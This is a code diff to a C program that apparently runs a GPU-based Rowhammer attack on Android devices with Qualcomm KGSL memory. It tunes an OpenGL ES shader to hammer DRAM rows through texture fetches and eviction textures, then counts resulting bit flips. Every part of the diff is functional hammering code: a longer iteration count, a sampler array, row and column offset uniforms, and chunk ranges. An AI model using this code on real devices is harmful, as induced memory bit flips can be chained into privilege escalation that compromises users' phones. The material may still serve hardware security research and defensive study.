@@ -191,7 +191,7 @@ const char *hammeringShaderSource2 = "#version 300 es\n"
 									"uniform sampler2D row2;\n"
 									"uniform int border;\n"
 									"//layout (location = 0) in vec3 threadD;\n"
-									"uniform sampler2D evict1;\n"  
+									"uniform sampler2D evict1[9];\n"  
 									"uniform sampler2D evict2;\n" 
 									"uniform sampler2D evict3;\n"
 									"uniform sampler2D evict4;\n"
@@ -203,31 +203,32 @@ const char *hammeringShaderSource2 = "#version 300 es\n"
 									"uniform sampler2D evict10;\n"
 									"uniform sampler2D evict11;\n"
 									"uniform sampler2D evict12;\n"
+									"uniform int j;\n"
+									"uniform int k;\n"
 									"vec4 val;\n"
 									"void main(){\n"
 									"	//int id = int(threadD.x) % 4;\n"
-									"	for(uint i = 0u; i < 1000u; i++){\n"
+									"	for(uint i = 0u; i < 1200000u; i++){\n"
 									"		\n"
-									"		 val += texelFetch(row1, ivec2( 0, 0), 0); \n "
-									"		 val += texelFetch(row1, ivec2(0, 2), 0) ;\n "
-									"		 val += texelFetch(row2, ivec2(0,0), 0) ;\n"
-									"		 val += texelFetch(row2, ivec2(0, 2), 0) ;\n "
-									"		 val += texelFetch(evict1, ivec2(0, 0), 0) ;\n "
-									"		 val += texelFetch(evict1, ivec2(0, 2), 0) ;\n "
-									"		 val += texelFetch(evict7, ivec2(0, 0), 0) ;\n "
-									"		 val += texelFetch(evict7, ivec2(0, 2), 0) ;\n "
-									"		 val += texelFetch(evict2, ivec2(0, 0), 0) ;\n "
-									"		 val += texelFetch(evict2, ivec2(0, 2), 0) ;\n "
-									"		 val += texelFetch(evict8, ivec2(0, 0), 0) ;\n "
-									"		 val += texelFetch(evict8, ivec2(0, 2), 0) ;\n "
-									"		 val += texelFetch(evict3, ivec2(0, 0), 0) ;\n "
-									"		 val += texelFetch(evict3, ivec2(0, 2), 0) ;\n "
-									"		 val += texelFetch(evict9, ivec2(0, 0), 0) ;\n "
-									"		 val += texelFetch(evict9, ivec2(0, 2), 0) ;\n "
-									"		 val += texelFetch(evict4, ivec2(0, 0), 0) ;\n "
-									"		 val += texelFetch(evict4, ivec2(0, 2), 0) ;\n "
+									"		 val += texelFetch(row1, ivec2(j, k), 0); \n "
+									"		 val += texelFetch(row2, ivec2(j, k), 0) ;\n "
+									"		 val += texelFetch(evict1[0], ivec2(j, k), 0) ;\n "
+									"		 val += texelFetch(evict1[6], ivec2(j, k), 0) ;\n "
+									"		 val += texelFetch(evict1[1], ivec2(j, k), 0) ;\n "
+									"		 val += texelFetch(evict1[7], ivec2(j, k), 0) ;\n "
+									"		 val += texelFetch(evict1[2], ivec2(j, k), 0) ;\n "
+									"		 val += texelFetch(evict1[8], ivec2(j, k), 0) ;\n "
+									"		 val += texelFetch(evict1[5], ivec2(j, k), 0) ;\n "
 
-
+									"		 val += texelFetch(row1, ivec2(j,k+2), 0) ;\n"
+									"		 val += texelFetch(row2, ivec2(j, k+2), 0) ;\n "
+									"		 val += texelFetch(evict1[0], ivec2(j, k+2), 0) ;\n "
+									"		 val += texelFetch(evict1[6], ivec2(j, k+2), 0) ;\n "
+									"		 val += texelFetch(evict1[1], ivec2(j, k+2), 0) ;\n "
+									"		 val += texelFetch(evict1[7], ivec2(j, k+2), 0) ;\n "
+									"		 val += texelFetch(evict1[2], ivec2(j, k+2), 0) ;\n "
+									"		 val += texelFetch(evict1[8], ivec2(j, k+2), 0) ;\n "
+									"		 val += texelFetch(evict1[5], ivec2(j, k+2), 0) ;\n "
 									"	}\n"
 									"	gl_Position = val;\n"
 									"}\n\0";
@@ -602,7 +603,7 @@ int main()
 	glDeleteShader(fragmentShader);
 	glDeleteShader(vertexShader);
 	int bitflips = 0;
-	for (size_t i = 14; i < cont_kgsls; ++i)
+	for (size_t i = 23; i < cont_kgsls; ++i)
 	{
 		// preparing program to run
 		struct kgsl_entry *evictarr[15];
@@ -637,7 +638,7 @@ int main()
 			currr = currr->kgsl_next;
 		}
 
-		for (int k = 0; k < 28; k += 1)
+		for (int k = 10; k < 28; k += 1)
 		{
 			// Hammering two rows...
 			GLuint group[2];
@@ -656,6 +657,7 @@ int main()
 
 			if (((uint64_t)row1->kgsl_pa >> 13 & 0x7) != ((uint64_t)row1->kgsl_next->kgsl_pa >> 13 & 0x7))
 				goto next_iter;
+			for(int j = 0; j < 2; j += 4){for(int k2 = 0; k2 < 2; k2 += 4){
 			glGenVertexArrays(1, &VAO);
 			glGenBuffers(1, &VBO);	
 
@@ -734,7 +736,7 @@ int main()
 			glBindTexture(GL_TEXTURE_2D, evictarr[7]->kgsl_id);
 			glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 32, 32, GL_RGBA, GL_UNSIGNED_BYTE, frame2);
 
-			evictionTexLocation = glGetUniformLocation(shaderProgram2, "evict9");
+			evictionTexLocation = glGetUniformLocation(shaderProgram2, "evict1[8]");
 			glUniform1i(evictionTexLocation, 10);
 			glActiveTexture(GL_TEXTURE0 + 10); // eviction Texture Unit
 			glBindTexture(GL_TEXTURE_2D, evictarr[8]->kgsl_id);
@@ -758,6 +760,12 @@ int main()
 			glBindTexture(GL_TEXTURE_2D, evictarr[11]->kgsl_id);
 			glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 32, 32, GL_RGBA, GL_UNSIGNED_BYTE, frame2);
 
+			evictionTexLocation = glGetUniformLocation(shaderProgram2, "j");
+                        glUniform1i(evictionTexLocation, j);
+
+
+			evictionTexLocation = glGetUniformLocation(shaderProgram2, "k");
+                        glUniform1i(evictionTexLocation, k2);
 			printf("Trying to hammer chunk %d : %d\n", i, k);
 
 			row1TexLocation = glGetUniformLocation(shaderProgram2, "border");
@@ -778,7 +786,7 @@ int main()
 
 			glBindVertexArray(VAO);
 			clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &time1);
-			glDrawArrays(GL_POINTS, 0, 8);
+			glDrawArrays(GL_POINTS, 0, 1);
 			clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &time2);
 			glEndPerfMonitorAMD(monitor);
 			printf("MY TIMER RESULT %lu:%lu\n", diff(time1,time2).tv_sec, diff(time1,time2).tv_nsec);
@@ -840,6 +848,7 @@ int main()
 				victim = victim->kgsl_next;
 			}
 			glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, tex, 0);
+			}}; // int j = 0, k = 0... 
 		next_iter:
 			free(frame2);
 			row1 = row1->kgsl_next;
